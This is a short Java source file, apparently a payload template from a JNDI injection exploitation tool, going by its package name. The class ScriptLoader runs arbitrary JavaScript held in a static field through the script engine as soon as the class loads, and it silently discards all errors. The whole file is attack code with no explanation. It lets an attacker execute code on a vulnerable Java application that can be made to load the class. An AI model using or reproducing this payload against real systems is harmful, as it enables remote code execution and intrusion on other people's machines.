package map.jndi.template;

import javax.script.ScriptEngineManager;

public class ScriptLoader {
    public static String code;

    static {
        try {
            (new ScriptEngineManager()).getEngineByName("JavaScript").eval(code);
        } catch (Exception ignore) { }
    }
}
